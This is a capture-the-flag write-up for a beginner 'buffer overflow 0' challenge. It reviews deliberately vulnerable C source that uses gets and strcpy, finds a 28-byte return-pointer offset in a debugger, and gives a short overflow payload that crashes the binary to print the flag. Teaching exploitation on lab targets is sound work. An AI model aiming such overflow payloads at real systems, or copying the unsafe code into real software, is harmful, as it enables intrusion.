# buffer overflow 0

## Description

Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here.

Additional details will be available after launching your challenge instance.

## Enumeration

We are provided with two files: `vuln` and `vuln.c`. Before starting, lets do some enumeration on the artifact. First, lets check what kind of binary we're dealing with:

```bash
$ file ./vuln       
./vuln: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=b53f59f147e1b0b087a736016a44d1db6dee530c, for GNU/Linux 3.2.0, not stripped
```

This artifact is a 32-bit PIE executable. It's dynamically linked against libc. Lastly, its symbols are not stripped. 

Lets check the artifact securities:

```bash
$ pwn checksec vuln            
[*] 'buffer-overflow-0/vuln'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Everything is enabled except for stack canaries which will make overflowing buffers a lot easier.

## Code Review

We are given the source code in `vuln.c` so lets check that out:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```

The challenge begins by loading `flag.txt` into memory. It then sets up a signal handler for SIGSEGV, which will print the flag and exit when triggered. Finally, the application waits for user input.

There are two exploitable vulnerabilities: the `gets` function and the `strcpy` function. While this may seem tempting, our primary goal is to obtain the flag. If a SIGSEGV occurs, the `sigsegv_handler` callback function will be invoked, printing the flag to stdout. But what exactly is SIGSEGV?

## Linux Signals

In Linux, applications can handle events sent from the operating system, known as [signals](https://faculty.cs.niu.edu/~hutchins/csci480/signals.htm). A signal is a type of interrupt used to notify a process of asynchronous events. The operating system can send various signals to a process, such as SIGKILL to terminate it, SIGABRT to abort its execution, SIGSTOP to pause it, or SIGCONT to resume it.

SIGSEGV (segmentation fault) is one of these signals. It is sent to a process when it tries to access a memory location that it is not allowed to access. This error can be triggered by several issues, such as dereferencing null pointers, buffer overflows, invalid memory permissions, accessing freed pointers, or stack overflows.

In the context of this challenge, if we can induce the process to receive a SIGSEGV from the OS, it will print the flag and exit. To achieve this, we can exploit a buffer overflow to overwrite the return address with a pointer to invalid memory. This action will cause the OS to send a SIGSEGV, resulting in the flag being printed.

## Exploit Development

We could crash the application by sending large input to the buffer, but this approach lacks elegance.

Instead, let’s start by finding the offset to the return pointer. A more refined way to trigger a SIGSEGV is to overflow `buf2` in the `vuln` function.

```bash
gef➤  disass vuln
Dump of assembler code for function vuln:
   0x56556353 <+0>:     endbr32
   0x56556357 <+4>:     push   ebp
   0x56556358 <+5>:     mov    ebp,esp
   0x5655635a <+7>:     push   ebx
   0x5655635b <+8>:     sub    esp,0x14
   0x5655635e <+11>:    call   0x5655649b <__x86.get_pc_thunk.ax>
   0x56556363 <+16>:    add    eax,0x2c49
   0x56556368 <+21>:    sub    esp,0x8
   0x5655636b <+24>:    push   DWORD PTR [ebp+0x8]
   0x5655636e <+27>:    lea    edx,[ebp-0x18]
   0x56556371 <+30>:    push   edx
   0x56556372 <+31>:    mov    ebx,eax
   0x56556374 <+33>:    call   0x56556170 <strcpy@plt>
   0x56556379 <+38>:    add    esp,0x10
   0x5655637c <+41>:    nop
   0x5655637d <+42>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x56556380 <+45>:    leave
   0x56556381 <+46>: 
gef➤  b *0x56556381
gef➤  pattern create 128
gef➤  r
...
gef➤  pattern offset $esp
[+] Searching for '68616161'/'61616168' with period=4
[+] Found at offset 28 (little-endian search) likely
```

The offset to the return pointer is 28 bytes. We can confirm this by sending the following payload and then checking the return pointer after hitting the breakpoint again:

```bash
$ python3 -c 'print("A" * 28 + "B" * 4)'                       
AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

...

gef➤  x/xw $esp
0xffffcddc:     0x42424242
```

Believe it or not, that’s all there is to it! The payload `AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB` is sufficient for this challenge. The reason is that the address 0x42424242 is an invalid memory address. When the process attempts to access this address, the OS will send a SIGSEGV signal, causing the application to print the flag.